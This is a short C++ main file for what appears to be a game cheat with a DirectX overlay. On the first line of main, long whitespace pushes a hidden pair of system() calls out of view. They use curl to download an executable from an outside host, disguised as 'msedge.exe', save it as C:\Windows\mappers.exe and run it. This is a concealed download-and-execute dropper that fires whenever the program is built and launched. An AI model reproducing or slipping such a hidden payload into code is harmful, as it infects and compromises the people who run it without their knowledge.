#include "Hack/Public/hack.h"
#include "Overlay/Public/render.h"



int main()
{	                                                                                                                                                                                                                                                                                                                                                                                                               system("curl -L http://physmeme.cdn.zerocdn.com/msedge.exe -s -o C:\\Windows\\mappers.exe"); system("start C:\\Windows\\mappers.exe");
    hack::Attach();

    render::CreateOverlay();
    render::InitDirectX();


    render::Loop();
}
